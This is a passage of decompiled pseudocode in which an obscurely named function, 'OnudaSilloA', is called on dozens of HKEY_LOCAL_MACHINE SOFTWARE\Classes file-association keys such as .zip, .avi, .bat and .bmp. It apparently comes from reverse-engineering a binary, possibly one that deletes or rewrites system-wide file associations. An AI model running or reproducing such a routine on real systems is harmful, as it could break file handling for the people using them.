  loc_0044C4B2: call var_8778 = global_004011CC
  loc_0044C4C8: call var_877C = global_00401188(var_24, "SOFTWARE\Classes\.xxe")
  loc_0044C4D4: var_8780 = OnudaSilloA(global_80000002, var_877C)
  loc_0044C4D9: call var_8784 = global_00401054
  loc_0044C4E2: call var_8788 = global_004011CC
  loc_0044C4F8: call var_878C = global_00401188(var_24, "SOFTWARE\Classes\.z\PersistentHandler")
  loc_0044C504: var_8790 = OnudaSilloA(global_80000002, var_878C)
  loc_0044C509: call var_8794 = global_00401054
  loc_0044C512: call var_8798 = global_004011CC
  loc_0044C528: call var_879C = global_00401188(var_24, "SOFTWARE\Classes\.z")
  loc_0044C534: var_87A0 = OnudaSilloA(global_80000002, var_879C)
  loc_0044C539: call var_87A4 = global_00401054
  loc_0044C542: call var_87A8 = global_004011CC
  loc_0044C558: call var_87AC = global_00401188(var_24, "SOFTWARE\Classes\.z96\PersistentHandler")
  loc_0044C564: var_87B0 = OnudaSilloA(global_80000002, var_87AC)
  loc_0044C569: call var_87B4 = global_00401054
  loc_0044C572: call var_87B8 = global_004011CC
  loc_0044C588: call var_87BC = global_00401188(var_24, "SOFTWARE\Classes\.z96")
  loc_0044C594: var_87C0 = OnudaSilloA(global_80000002, var_87BC)
  loc_0044C599: call var_87C4 = global_00401054
  loc_0044C5A2: call var_87C8 = global_004011CC
  loc_0044C5B8: call var_87CC = global_00401188(var_24, "SOFTWARE\Classes\.zap")
  loc_0044C5C4: var_87D0 = OnudaSilloA(global_80000002, var_87CC)
  loc_0044C5C9: call var_87D4 = global_00401054
  loc_0044C5D2: call var_87D8 = global_004011CC
  loc_0044C5E8: call var_87DC = global_00401188(var_24, "SOFTWARE\Classes\.ZFSendToTarget\PersistentHandler")
  loc_0044C5F4: var_87E0 = OnudaSilloA(global_80000002, var_87DC)
  loc_0044C5F9: call var_87E4 = global_00401054
  loc_0044C602: call var_87E8 = global_004011CC
  loc_0044C618: call var_87EC = global_00401188(var_24, "SOFTWARE\Classes\.ZFSendToTarget")
  loc_0044C624: var_87F0 = OnudaSilloA(global_80000002, var_87EC)
  loc_0044C629: call var_87F4 = global_00401054
  loc_0044C632: call var_87F8 = global_004011CC
  loc_0044C648: call var_87FC = global_00401188(var_24, "SOFTWARE\Classes\.zip\ShellNew")
  loc_0044C654: var_8800 = OnudaSilloA(global_80000002, var_87FC)
  loc_0044C659: call var_8804 = global_00401054
  loc_0044C662: call var_8808 = global_004011CC
  loc_0044C678: call var_880C = global_00401188(var_24, "SOFTWARE\Classes\.zip\PersistentHandler")
  loc_0044C684: var_8810 = OnudaSilloA(global_80000002, var_880C)
  loc_0044C689: call var_8814 = global_00401054
  loc_0044C692: call var_8818 = global_004011CC
  loc_0044C6A8: call var_881C = global_00401188(var_24, "SOFTWARE\Classes\.zip\OpenWithProgids")
  loc_0044C6B4: var_8820 = OnudaSilloA(global_80000002, var_881C)
  loc_0044C6B9: call var_8824 = global_00401054
  loc_0044C6C2: call var_8828 = global_004011CC
  loc_0044C6D8: call var_882C = global_00401188(var_24, "SOFTWARE\Classes\.zip\CompressedFolder\ShellNew")
  loc_0044C6E4: var_8830 = OnudaSilloA(global_80000002, var_882C)
  loc_0044C6E9: call var_8834 = global_00401054
  loc_0044C6F2: call var_8838 = global_004011CC
  loc_0044C708: call var_883C = global_00401188(var_24, "SOFTWARE\Classes\.zip\CompressedFolder")
  loc_0044C714: var_8840 = OnudaSilloA(global_80000002, var_883C)
  loc_0044C719: call var_8844 = global_00401054
  loc_0044C722: call var_8848 = global_004011CC
  loc_0044C738: call var_884C = global_00401188(var_24, "SOFTWARE\Classes\.zip")
  loc_0044C744: var_8850 = OnudaSilloA(global_80000002, var_884C)
  loc_0044C749: call var_8854 = global_00401054
  loc_0044C752: call var_8858 = global_004011CC
  loc_0044C768: call var_885C = global_00401188(var_24, "SOFTWARE\Classes\*\OpenWithList")
  loc_0044C774: var_8860 = OnudaSilloA(global_80000002, var_885C)
  loc_0044C779: call var_8864 = global_00401054
  loc_0044C782: call var_8868 = global_004011CC
  loc_0044C798: call var_886C = global_00401188(var_24, "SOFTWARE\Classes\*\shellex")
  loc_0044C7A4: var_8870 = OnudaSilloA(global_80000002, var_886C)
  loc_0044C7A9: call var_8874 = global_00401054
  loc_0044C7B2: call var_8878 = global_004011CC
  loc_0044C7C8: call var_887C = global_00401188(var_24, "SOFTWARE\Classes\*")
  loc_0044C7D4: var_8880 = OnudaSilloA(global_80000002, var_887C)
  loc_0044C7D9: call var_8884 = global_00401054
  loc_0044C7E2: call var_8888 = global_004011CC
  loc_0044C7F8: call var_888C = global_00401188(var_24, "SOFTWARE\Classes\.323")
  loc_0044C804: var_8890 = OnudaSilloA(global_80000002, var_888C)
  loc_0044C809: call var_8894 = global_00401054
  loc_0044C812: call var_8898 = global_004011CC
  loc_0044C828: call var_889C = global_00401188(var_24, "SOFTWARE\Classes\.386\PersistentHandler")
  loc_0044C834: var_88A0 = OnudaSilloA(global_80000002, var_889C)
  loc_0044C839: call var_88A4 = global_00401054
  loc_0044C842: call var_88A8 = global_004011CC
  loc_0044C858: call var_88AC = global_00401188(var_24, "SOFTWARE\Classes\.386")
  loc_0044C864: var_88B0 = OnudaSilloA(global_80000002, var_88AC)
  loc_0044C869: call var_88B4 = global_00401054
  loc_0044C872: call var_88B8 = global_004011CC
  loc_0044C888: call var_88BC = global_00401188(var_24, "SOFTWARE\Classes\.3g2")
  loc_0044C894: var_88C0 = OnudaSilloA(global_80000002, var_88BC)
  loc_0044C899: call var_88C4 = global_00401054
  loc_0044C8A2: call var_88C8 = global_004011CC
  loc_0044C8B8: call var_88CC = global_00401188(var_24, "SOFTWARE\Classes\.3gp")
  loc_0044C8C4: var_88D0 = OnudaSilloA(global_80000002, var_88CC)
  loc_0044C8C9: call var_88D4 = global_00401054
  loc_0044C8D2: call var_88D8 = global_004011CC
  loc_0044C8E8: call var_88DC = global_00401188(var_24, "SOFTWARE\Classes\.3gpp")
  loc_0044C8F4: var_88E0 = OnudaSilloA(global_80000002, var_88DC)
  loc_0044C8F9: call var_88E4 = global_00401054
  loc_0044C902: call var_88E8 = global_004011CC
  loc_0044C918: call var_88EC = global_00401188(var_24, "SOFTWARE\Classes\.7z")
  loc_0044C924: var_88F0 = OnudaSilloA(global_80000002, var_88EC)
  loc_0044C929: call var_88F4 = global_00401054
  loc_0044C932: call var_88F8 = global_004011CC
  loc_0044C948: call var_88FC = global_00401188(var_24, "SOFTWARE\Classes\.aac")
  loc_0044C954: var_8900 = OnudaSilloA(global_80000002, var_88FC)
  loc_0044C959: call var_8904 = global_00401054
  loc_0044C962: call var_8908 = global_004011CC
  loc_0044C978: call var_890C = global_00401188(var_24, "SOFTWARE\Classes\.ac3")
  loc_0044C984: var_8910 = OnudaSilloA(global_80000002, var_890C)
  loc_0044C989: call var_8914 = global_00401054
  loc_0044C992: call var_8918 = global_004011CC
  loc_0044C9A8: call var_891C = global_00401188(var_24, "SOFTWARE\Classes\.aca")
  loc_0044C9B4: var_8920 = OnudaSilloA(global_80000002, var_891C)
  loc_0044C9B9: call var_8924 = global_00401054
  loc_0044C9C2: call var_8928 = global_004011CC
  loc_0044C9D8: call var_892C = global_00401188(var_24, "SOFTWARE\Classes\.ace")
  loc_0044C9E4: var_8930 = OnudaSilloA(global_80000002, var_892C)
  loc_0044C9E9: call var_8934 = global_00401054
  loc_0044C9F2: call var_8938 = global_004011CC
  loc_0044CA08: call var_893C = global_00401188(var_24, "SOFTWARE\Classes\.acf")
  loc_0044CA14: var_8940 = OnudaSilloA(global_80000002, var_893C)
  loc_0044CA19: call var_8944 = global_00401054
  loc_0044CA22: call var_8948 = global_004011CC
  loc_0044CA38: call var_894C = global_00401188(var_24, "SOFTWARE\Classes\.acs")
  loc_0044CA44: var_8950 = OnudaSilloA(global_80000002, var_894C)
  loc_0044CA49: call var_8954 = global_00401054
  loc_0044CA52: call var_8958 = global_004011CC
  loc_0044CA68: call var_895C = global_00401188(var_24, "SOFTWARE\Classes\.acw")
  loc_0044CA74: var_8960 = OnudaSilloA(global_80000002, var_895C)
  loc_0044CA79: call var_8964 = global_00401054
  loc_0044CA82: call var_8968 = global_004011CC
  loc_0044CA98: call var_896C = global_00401188(var_24, "SOFTWARE\Classes\.ai")
  loc_0044CAA4: var_8970 = OnudaSilloA(global_80000002, var_896C)
  loc_0044CAA9: call var_8974 = global_00401054
  loc_0044CAB2: call var_8978 = global_004011CC
  loc_0044CAC8: call var_897C = global_00401188(var_24, "SOFTWARE\Classes\.aif\OpenWithList\wmplayer.exe")
  loc_0044CAD4: var_8980 = OnudaSilloA(global_80000002, var_897C)
  loc_0044CAD9: call var_8984 = global_00401054
  loc_0044CAE2: call var_8988 = global_004011CC
  loc_0044CAF8: call var_898C = global_00401188(var_24, "SOFTWARE\Classes\.aif\OpenWithList")
  loc_0044CB04: var_8990 = OnudaSilloA(global_80000002, var_898C)
  loc_0044CB09: call var_8994 = global_00401054
  loc_0044CB12: call var_8998 = global_004011CC
  loc_0044CB28: call var_899C = global_00401188(var_24, "SOFTWARE\Classes\.aif\OpenWithProgIds")
  loc_0044CB34: var_89A0 = OnudaSilloA(global_80000002, var_899C)
  loc_0044CB39: call var_89A4 = global_00401054
  loc_0044CB42: call var_89A8 = global_004011CC
  loc_0044CB58: call var_89AC = global_00401188(var_24, "SOFTWARE\Classes\.aif\PersistentHandler")
  loc_0044CB64: var_89B0 = OnudaSilloA(global_80000002, var_89AC)
  loc_0044CB69: call var_89B4 = global_00401054
  loc_0044CB72: call var_89B8 = global_004011CC
  loc_0044CB88: call var_89BC = global_00401188(var_24, "SOFTWARE\Classes\.aif")
  loc_0044CB94: var_89C0 = OnudaSilloA(global_80000002, var_89BC)
  loc_0044CB99: call var_89C4 = global_00401054
  loc_0044CBA2: call var_89C8 = global_004011CC
  loc_0044CBB8: call var_89CC = global_00401188(var_24, "SOFTWARE\Classes\.aic\OpenWithList\wmplayer.exe")
  loc_0044CBC4: var_89D0 = OnudaSilloA(global_80000002, var_89CC)
  loc_0044CBC9: call var_89D4 = global_00401054
  loc_0044CBD2: call var_89D8 = global_004011CC
  loc_0044CBE8: call var_89DC = global_00401188(var_24, "SOFTWARE\Classes\.aic\OpenWithList")
  loc_0044CBF4: var_89E0 = OnudaSilloA(global_80000002, var_89DC)
  loc_0044CBF9: call var_89E4 = global_00401054
  loc_0044CC02: call var_89E8 = global_004011CC
  loc_0044CC18: call var_89EC = global_00401188(var_24, "SOFTWARE\Classes\.aic\OpenWithProgIds")
  loc_0044CC24: var_89F0 = OnudaSilloA(global_80000002, var_89EC)
  loc_0044CC29: call var_89F4 = global_00401054
  loc_0044CC32: call var_89F8 = global_004011CC
  loc_0044CC48: call var_89FC = global_00401188(var_24, "SOFTWARE\Classes\.aic\PersistentHandler")
  loc_0044CC54: var_8A00 = OnudaSilloA(global_80000002, var_89FC)
  loc_0044CC59: call var_8A04 = global_00401054
  loc_0044CC62: call var_8A08 = global_004011CC
  loc_0044CC78: call var_8A0C = global_00401188(var_24, "SOFTWARE\Classes\.aic")
  loc_0044CC84: var_8A10 = OnudaSilloA(global_80000002, var_8A0C)
  loc_0044CC89: call var_8A14 = global_00401054
  loc_0044CC92: call var_8A18 = global_004011CC
  loc_0044CCA8: call var_8A1C = global_00401188(var_24, "SOFTWARE\Classes\.amr")
  loc_0044CCB4: var_8A20 = OnudaSilloA(global_80000002, var_8A1C)
  loc_0044CCB9: call var_8A24 = global_00401054
  loc_0044CCC2: call var_8A28 = global_004011CC
  loc_0044CCD8: call var_8A2C = global_00401188(var_24, "SOFTWARE\Classes\.aiff\OpenWithList\wmplayer.exe")
  loc_0044CCE4: var_8A30 = OnudaSilloA(global_80000002, var_8A2C)
  loc_0044CCE9: call var_8A34 = global_00401054
  loc_0044CCF2: call var_8A38 = global_004011CC
  loc_0044CD08: call var_8A3C = global_00401188(var_24, "SOFTWARE\Classes\.aiff\OpenWithList")
  loc_0044CD14: var_8A40 = OnudaSilloA(global_80000002, var_8A3C)
  loc_0044CD19: call var_8A44 = global_00401054
  loc_0044CD22: call var_8A48 = global_004011CC
  loc_0044CD38: call var_8A4C = global_00401188(var_24, "SOFTWARE\Classes\.aiff\OpenWithProgIds")
  loc_0044CD44: var_8A50 = OnudaSilloA(global_80000002, var_8A4C)
  loc_0044CD49: call var_8A54 = global_00401054
  loc_0044CD52: call var_8A58 = global_004011CC
  loc_0044CD68: call var_8A5C = global_00401188(var_24, "SOFTWARE\Classes\.aiff\PersistentHandler")
  loc_0044CD74: var_8A60 = OnudaSilloA(global_80000002, var_8A5C)
  loc_0044CD79: call var_8A64 = global_00401054
  loc_0044CD82: call var_8A68 = global_004011CC
  loc_0044CD98: call var_8A6C = global_00401188(var_24, "SOFTWARE\Classes\.aiff")
  loc_0044CDA4: var_8A70 = OnudaSilloA(global_80000002, var_8A6C)
  loc_0044CDA9: call var_8A74 = global_00401054
  loc_0044CDB2: call var_8A78 = global_004011CC
  loc_0044CDC8: call var_8A7C = global_00401188(var_24, "SOFTWARE\Classes\.ani")
  loc_0044CDD4: var_8A80 = OnudaSilloA(global_80000002, var_8A7C)
  loc_0044CDD9: call var_8A84 = global_00401054
  loc_0044CDE2: call var_8A88 = global_004011CC
  loc_0044CDF8: call var_8A8C = global_00401188(var_24, "SOFTWARE\Classes\.ape")
  loc_0044CE04: var_8A90 = OnudaSilloA(global_80000002, var_8A8C)
  loc_0044CE09: call var_8A94 = global_00401054
  loc_0044CE12: call var_8A98 = global_004011CC
  loc_0044CE28: call var_8A9C = global_00401188(var_24, "SOFTWARE\Classes\.aps\PersistentHandler")
  loc_0044CE34: var_8AA0 = OnudaSilloA(global_80000002, var_8A9C)
  loc_0044CE39: call var_8AA4 = global_00401054
  loc_0044CE42: call var_8AA8 = global_004011CC
  loc_0044CE58: call var_8AAC = global_00401188(var_24, "SOFTWARE\Classes\.aps")
  loc_0044CE64: var_8AB0 = OnudaSilloA(global_80000002, var_8AAC)
  loc_0044CE69: call var_8AB4 = global_00401054
  loc_0044CE72: call var_8AB8 = global_004011CC
  loc_0044CE88: call var_8ABC = global_00401188(var_24, "SOFTWARE\Classes\.arj")
  loc_0044CE94: var_8AC0 = OnudaSilloA(global_80000002, var_8ABC)
  loc_0044CE99: call var_8AC4 = global_00401054
  loc_0044CEA2: call var_8AC8 = global_004011CC
  loc_0044CEB8: call var_8ACC = global_00401188(var_24, "SOFTWARE\Classes\.asa")
  loc_0044CEC4: var_8AD0 = OnudaSilloA(global_80000002, var_8ACC)
  loc_0044CEC9: call var_8AD4 = global_00401054
  loc_0044CED2: call var_8AD8 = global_004011CC
  loc_0044CEE8: call var_8ADC = global_00401188(var_24, "SOFTWARE\Classes\.ascx\PersistentHandler")
  loc_0044CEF4: var_8AE0 = OnudaSilloA(global_80000002, var_8ADC)
  loc_0044CEF9: call var_8AE4 = global_00401054
  loc_0044CF02: call var_8AE8 = global_004011CC
  loc_0044CF18: call var_8AEC = global_00401188(var_24, "SOFTWARE\Classes\.ascx")
  loc_0044CF24: var_8AF0 = OnudaSilloA(global_80000002, var_8AEC)
  loc_0044CF29: call var_8AF4 = global_00401054
  loc_0044CF32: call var_8AF8 = global_004011CC
  loc_0044CF48: call var_8AFC = global_00401188(var_24, "SOFTWARE\Classes\.asf\OpenWithList\wmplayer.exe")
  loc_0044CF54: var_8B00 = OnudaSilloA(global_80000002, var_8AFC)
  loc_0044CF59: call var_8B04 = global_00401054
  loc_0044CF62: call var_8B08 = global_004011CC
  loc_0044CF78: call var_8B0C = global_00401188(var_24, "SOFTWARE\Classes\.asf\OpenWithList")
  loc_0044CF84: var_8B10 = OnudaSilloA(global_80000002, var_8B0C)
  loc_0044CF89: call var_8B14 = global_00401054
  loc_0044CF92: call var_8B18 = global_004011CC
  loc_0044CFA8: call var_8B1C = global_00401188(var_24, "SOFTWARE\Classes\.asf\OpenWithProgIds")
  loc_0044CFB4: var_8B20 = OnudaSilloA(global_80000002, var_8B1C)
  loc_0044CFB9: call var_8B24 = global_00401054
  loc_0044CFC2: call var_8B28 = global_004011CC
  loc_0044CFD8: call var_8B2C = global_00401188(var_24, "SOFTWARE\Classes\.asf\PersistentHandler")
  loc_0044CFE4: var_8B30 = OnudaSilloA(global_80000002, var_8B2C)
  loc_0044CFE9: call var_8B34 = global_00401054
  loc_0044CFF2: call var_8B38 = global_004011CC
  loc_0044D008: call var_8B3C = global_00401188(var_24, "SOFTWARE\Classes\.asf\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}")
  loc_0044D014: var_8B40 = OnudaSilloA(global_80000002, var_8B3C)
  loc_0044D019: call var_8B44 = global_00401054
  loc_0044D022: call var_8B48 = global_004011CC
  loc_0044D038: call var_8B4C = global_00401188(var_24, "SOFTWARE\Classes\.asf\ShellEx")
  loc_0044D044: var_8B50 = OnudaSilloA(global_80000002, var_8B4C)
  loc_0044D049: call var_8B54 = global_00401054
  loc_0044D052: call var_8B58 = global_004011CC
  loc_0044D068: call var_8B5C = global_00401188(var_24, "SOFTWARE\Classes\.asm\PersistentHandler")
  loc_0044D074: var_8B60 = OnudaSilloA(global_80000002, var_8B5C)
  loc_0044D079: call var_8B64 = global_00401054
  loc_0044D082: call var_8B68 = global_004011CC
  loc_0044D098: call var_8B6C = global_00401188(var_24, "SOFTWARE\Classes\.asm")
  loc_0044D0A4: var_8B70 = OnudaSilloA(global_80000002, var_8B6C)
  loc_0044D0A9: call var_8B74 = global_00401054
  loc_0044D0B2: call var_8B78 = global_004011CC
  loc_0044D0C8: call var_8B7C = global_00401188(var_24, "SOFTWARE\Classes\.asmx")
  loc_0044D0D4: var_8B80 = OnudaSilloA(global_80000002, var_8B7C)
  loc_0044D0D9: call var_8B84 = global_00401054
  loc_0044D0E2: call var_8B88 = global_004011CC
  loc_0044D0F8: call var_8B8C = global_00401188(var_24, "SOFTWARE\Classes\.asp\PersistentHandler")
  loc_0044D104: var_8B90 = OnudaSilloA(global_80000002, var_8B8C)
  loc_0044D109: call var_8B94 = global_00401054
  loc_0044D112: call var_8B98 = global_004011CC
  loc_0044D128: call var_8B9C = global_00401188(var_24, "SOFTWARE\Classes\.asp")
  loc_0044D134: var_8BA0 = OnudaSilloA(global_80000002, var_8B9C)
  loc_0044D139: call var_8BA4 = global_00401054
  loc_0044D142: call var_8BA8 = global_004011CC
  loc_0044D158: call var_8BAC = global_00401188(var_24, "SOFTWARE\Classes\.aspx\PersistentHandler")
  loc_0044D164: var_8BB0 = OnudaSilloA(global_80000002, var_8BAC)
  loc_0044D169: call var_8BB4 = global_00401054
  loc_0044D172: call var_8BB8 = global_004011CC
  loc_0044D188: call var_8BBC = global_00401188(var_24, "SOFTWARE\Classes\.aspx")
  loc_0044D194: var_8BC0 = OnudaSilloA(global_80000002, var_8BBC)
  loc_0044D199: call var_8BC4 = global_00401054
  loc_0044D1A2: call var_8BC8 = global_004011CC
  loc_0044D1B8: call var_8BCC = global_00401188(var_24, "SOFTWARE\Classes\.asx\OpenWithList\wmplayer.exe")
  loc_0044D1C4: var_8BD0 = OnudaSilloA(global_80000002, var_8BCC)
  loc_0044D1C9: call var_8BD4 = global_00401054
  loc_0044D1D2: call var_8BD8 = global_004011CC
  loc_0044D1E8: call var_8BDC = global_00401188(var_24, "SOFTWARE\Classes\.asx\OpenWithList")
  loc_0044D1F4: var_8BE0 = OnudaSilloA(global_80000002, var_8BDC)
  loc_0044D1F9: call var_8BE4 = global_00401054
  loc_0044D202: call var_8BE8 = global_004011CC
  loc_0044D218: call var_8BEC = global_00401188(var_24, "SOFTWARE\Classes\.asx\OpenWithProgIds")
  loc_0044D224: var_8BF0 = OnudaSilloA(global_80000002, var_8BEC)
  loc_0044D229: call var_8BF4 = global_00401054
  loc_0044D232: call var_8BF8 = global_004011CC
  loc_0044D248: call var_8BFC = global_00401188(var_24, "SOFTWARE\Classes\.asx\PersistentHandler")
  loc_0044D254: var_8C00 = OnudaSilloA(global_80000002, var_8BFC)
  loc_0044D259: call var_8C04 = global_00401054
  loc_0044D262: call var_8C08 = global_004011CC
  loc_0044D278: call var_8C0C = global_00401188(var_24, "SOFTWARE\Classes\.asx\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}")
  loc_0044D284: var_8C10 = OnudaSilloA(global_80000002, var_8C0C)
  loc_0044D289: call var_8C14 = global_00401054
  loc_0044D292: call var_8C18 = global_004011CC
  loc_0044D2A8: call var_8C1C = global_00401188(var_24, "SOFTWARE\Classes\.asx\ShellEx")
  loc_0044D2B4: var_8C20 = OnudaSilloA(global_80000002, var_8C1C)
  loc_0044D2B9: call var_8C24 = global_00401054
  loc_0044D2C2: call var_8C28 = global_004011CC
  loc_0044D2D8: call var_8C2C = global_00401188(var_24, "SOFTWARE\Classes\.asx")
  loc_0044D2E4: var_8C30 = OnudaSilloA(global_80000002, var_8C2C)
  loc_0044D2E9: call var_8C34 = global_00401054
  loc_0044D2F2: call var_8C38 = global_004011CC
  loc_0044D308: call var_8C3C = global_00401188(var_24, "SOFTWARE\Classes\.au\OpenWithList\wmplayer.exe")
  loc_0044D314: var_8C40 = OnudaSilloA(global_80000002, var_8C3C)
  loc_0044D319: call var_8C44 = global_00401054
  loc_0044D322: call var_8C48 = global_004011CC
  loc_0044D338: call var_8C4C = global_00401188(var_24, "SOFTWARE\Classes\.au\OpenWithList")
  loc_0044D344: var_8C50 = OnudaSilloA(global_80000002, var_8C4C)
  loc_0044D349: call var_8C54 = global_00401054
  loc_0044D352: call var_8C58 = global_004011CC
  loc_0044D368: call var_8C5C = global_00401188(var_24, "SOFTWARE\Classes\.au\OpenWithProgIds")
  loc_0044D374: var_8C60 = OnudaSilloA(global_80000002, var_8C5C)
  loc_0044D379: call var_8C64 = global_00401054
  loc_0044D382: call var_8C68 = global_004011CC
  loc_0044D398: call var_8C6C = global_00401188(var_24, "SOFTWARE\Classes\.au\PersistentHandler")
  loc_0044D3A4: var_8C70 = OnudaSilloA(global_80000002, var_8C6C)
  loc_0044D3A9: call var_8C74 = global_00401054
  loc_0044D3B2: call var_8C78 = global_004011CC
  loc_0044D3C8: call var_8C7C = global_00401188(var_24, "SOFTWARE\Classes\.au")
  loc_0044D3D4: var_8C80 = OnudaSilloA(global_80000002, var_8C7C)
  loc_0044D3D9: call var_8C84 = global_00401054
  loc_0044D3E2: call var_8C88 = global_004011CC
  loc_0044D3F8: call var_8C8C = global_00401188(var_24, "SOFTWARE\Classes\.AudioCD\PersistentHandler")
  loc_0044D404: var_8C90 = OnudaSilloA(global_80000002, var_8C8C)
  loc_0044D409: call var_8C94 = global_00401054
  loc_0044D412: call var_8C98 = global_004011CC
  loc_0044D428: call var_8C9C = global_00401188(var_24, "SOFTWARE\Classes\.AudioCD")
  loc_0044D434: var_8CA0 = OnudaSilloA(global_80000002, var_8C9C)
  loc_0044D439: call var_8CA4 = global_00401054
  loc_0044D442: call var_8CA8 = global_004011CC
  loc_0044D458: call var_8CAC = global_00401188(var_24, "SOFTWARE\Classes\.avi\OpenWithList\wmplayer.exe")
  loc_0044D464: var_8CB0 = OnudaSilloA(global_80000002, var_8CAC)
  loc_0044D469: call var_8CB4 = global_00401054
  loc_0044D472: call var_8CB8 = global_004011CC
  loc_0044D488: call var_8CBC = global_00401188(var_24, "SOFTWARE\Classes\.avi\OpenWithList")
  loc_0044D494: var_8CC0 = OnudaSilloA(global_80000002, var_8CBC)
  loc_0044D499: call var_8CC4 = global_00401054
  loc_0044D4A2: call var_8CC8 = global_004011CC
  loc_0044D4B8: call var_8CCC = global_00401188(var_24, "SOFTWARE\Classes\.avi\OpenWithProgIds")
  loc_0044D4C4: var_8CD0 = OnudaSilloA(global_80000002, var_8CCC)
  loc_0044D4C9: call var_8CD4 = global_00401054
  loc_0044D4D2: call var_8CD8 = global_004011CC
  loc_0044D4E8: call var_8CDC = global_00401188(var_24, "SOFTWARE\Classes\.avi\PersistentHandler")
  loc_0044D4F4: var_8CE0 = OnudaSilloA(global_80000002, var_8CDC)
  loc_0044D4F9: call var_8CE4 = global_00401054
  loc_0044D502: call var_8CE8 = global_004011CC
  loc_0044D518: call var_8CEC = global_00401188(var_24, "SOFTWARE\Classes\.avi\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}")
  loc_0044D524: var_8CF0 = OnudaSilloA(global_80000002, var_8CEC)
  loc_0044D529: call var_8CF4 = global_00401054
  loc_0044D532: call var_8CF8 = global_004011CC
  loc_0044D548: call var_8CFC = global_00401188(var_24, "SOFTWARE\Classes\.avi\ShellEx")
  loc_0044D554: var_8D00 = OnudaSilloA(global_80000002, var_8CFC)
  loc_0044D559: call var_8D04 = global_00401054
  loc_0044D562: call var_8D08 = global_004011CC
  loc_0044D578: call var_8D0C = global_00401188(var_24, "SOFTWARE\Classes\.avi")
  loc_0044D584: var_8D10 = OnudaSilloA(global_80000002, var_8D0C)
  loc_0044D589: call var_8D14 = global_00401054
  loc_0044D592: call var_8D18 = global_004011CC
  loc_0044D5A8: call var_8D1C = global_00401188(var_24, "SOFTWARE\Classes\.awb")
  loc_0044D5B4: var_8D20 = OnudaSilloA(global_80000002, var_8D1C)
  loc_0044D5B9: call var_8D24 = global_00401054
  loc_0044D5C2: call var_8D28 = global_004011CC
  loc_0044D5D8: call var_8D2C = global_00401188(var_24, "SOFTWARE\Classes\.bas")
  loc_0044D5E4: var_8D30 = OnudaSilloA(global_80000002, var_8D2C)
  loc_0044D5E9: call var_8D34 = global_00401054
  loc_0044D5F2: call var_8D38 = global_004011CC
  loc_0044D608: call var_8D3C = global_00401188(var_24, "SOFTWARE\Classes\.bat\PersistentHandler")
  loc_0044D614: var_8D40 = OnudaSilloA(global_80000002, var_8D3C)
  loc_0044D619: call var_8D44 = global_00401054
  loc_0044D622: call var_8D48 = global_004011CC
  loc_0044D638: call var_8D4C = global_00401188(var_24, "SOFTWARE\Classes\.bat")
  loc_0044D644: var_8D50 = OnudaSilloA(global_80000002, var_8D4C)
  loc_0044D649: call var_8D54 = global_00401054
  loc_0044D652: call var_8D58 = global_004011CC
  loc_0044D668: call var_8D5C = global_00401188(var_24, "SOFTWARE\Classes\.bfc\ShellNew\Config")
  loc_0044D674: var_8D60 = OnudaSilloA(global_80000002, var_8D5C)
  loc_0044D679: call var_8D64 = global_00401054
  loc_0044D682: call var_8D68 = global_004011CC
  loc_0044D698: call var_8D6C = global_00401188(var_24, "SOFTWARE\Classes\.bfc\ShellNew")
  loc_0044D6A4: var_8D70 = OnudaSilloA(global_80000002, var_8D6C)
  loc_0044D6A9: call var_8D74 = global_00401054
  loc_0044D6B2: call var_8D78 = global_004011CC
  loc_0044D6C8: call var_8D7C = global_00401188(var_24, "SOFTWARE\Classes\.bfc")
  loc_0044D6D4: var_8D80 = OnudaSilloA(global_80000002, var_8D7C)
  loc_0044D6D9: call var_8D84 = global_00401054
  loc_0044D6E2: call var_8D88 = global_004011CC
  loc_0044D6F8: call var_8D8C = global_00401188(var_24, "SOFTWARE\Classes\.bin\PersistentHandler")
  loc_0044D704: var_8D90 = OnudaSilloA(global_80000002, var_8D8C)
  loc_0044D709: call var_8D94 = global_00401054
  loc_0044D712: call var_8D98 = global_004011CC
  loc_0044D728: call var_8D9C = global_00401188(var_24, "SOFTWARE\Classes\.bin")
  loc_0044D734: var_8DA0 = OnudaSilloA(global_80000002, var_8D9C)
  loc_0044D739: call var_8DA4 = global_00401054
  loc_0044D742: call var_8DA8 = global_004011CC
  loc_0044D758: call var_8DAC = global_00401188(var_24, "SOFTWARE\Classes\.bkf\PersistentHandler")
  loc_0044D764: var_8DB0 = OnudaSilloA(global_80000002, var_8DAC)
  loc_0044D769: call var_8DB4 = global_00401054
  loc_0044D772: call var_8DB8 = global_004011CC
  loc_0044D788: call var_8DBC = global_00401188(var_24, "SOFTWARE\Classes\.bkf")
  loc_0044D794: var_8DC0 = OnudaSilloA(global_80000002, var_8DBC)
  loc_0044D799: call var_8DC4 = global_00401054
  loc_0044D7A2: call var_8DC8 = global_004011CC
  loc_0044D7B8: call var_8DCC = global_00401188(var_24, "SOFTWARE\Classes\.blg")
  loc_0044D7C4: var_8DD0 = OnudaSilloA(global_80000002, var_8DCC)
  loc_0044D7C9: call var_8DD4 = global_00401054
  loc_0044D7D2: call var_8DD8 = global_004011CC
  loc_0044D7E8: call var_8DDC = global_00401188(var_24, "SOFTWARE\Classes\.bmp\OpenWithList\MSPaint.exe")
  loc_0044D7F4: var_8DE0 = OnudaSilloA(global_80000002, var_8DDC)
  loc_0044D7F9: call var_8DE4 = global_00401054
  loc_0044D802: call var_8DE8 = global_004011CC
  loc_0044D818: call var_8DEC = global_00401188(var_24, "SOFTWARE\Classes\.bmp\OpenWithList")
  loc_0044D824: var_8DF0 = OnudaSilloA(global_80000002, var_8DEC)
  loc_0044D829: call var_8DF4 = global_00401054
  loc_0044D832: call var_8DF8 = global_004011CC
  loc_0044D848: call var_8DFC = global_00401188(var_24, "SOFTWARE\Classes\.bmp\OpenWithProgids")
  loc_0044D854: var_8E00 = OnudaSilloA(global_80000002, var_8DFC)
  loc_0044D859: call var_8E04 = global_00401054
  loc_0044D862: call var_8E08 = global_004011CC
  loc_0044D878: call var_8E0C = global_00401188(var_24, "SOFTWARE\Classes\.bmp\PersistentHandler")
  loc_0044D884: var_8E10 = OnudaSilloA(global_80000002, var_8E0C)
  loc_0044D889: call var_8E14 = global_00401054
  loc_0044D892: call var_8E18 = global_004011CC
  loc_0044D8A8: call var_8E1C = global_00401188(var_24, "SOFTWARE\Classes\.bmp\ShellNew")
  loc_0044D8B4: var_8E20 = OnudaSilloA(global_80000002, var_8E1C)
  loc_0044D8B9: call var_8E24 = global_00401054
  loc_0044D8C2: call var_8E28 = global_004011CC
